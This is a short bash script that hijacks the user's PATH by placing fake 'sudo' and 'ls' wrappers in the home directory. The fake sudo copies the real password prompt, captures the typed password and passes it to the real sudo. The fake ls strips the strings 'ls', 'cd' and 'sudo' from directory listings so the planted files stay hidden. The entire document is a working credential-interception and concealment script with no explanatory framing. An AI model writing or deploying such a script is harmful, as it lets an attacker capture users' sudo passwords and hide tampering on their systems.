#!/bin/bash

PATH=~:$PATH

#Hook sudo
echo "#!/bin/bash" > ~/sudo
echo "read -sp \"[sudo] password for \$(whoami): \" p" >> ~/sudo
echo "echo \$p | /usr/bin/sudo -S \$@" >> ~/sudo
chmod +x sudo

#Hook ls
echo "#!/bin/bash" > ~/ls
echo "/bin/ls \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ~/ls
chmod +x ~/ls



exec bash
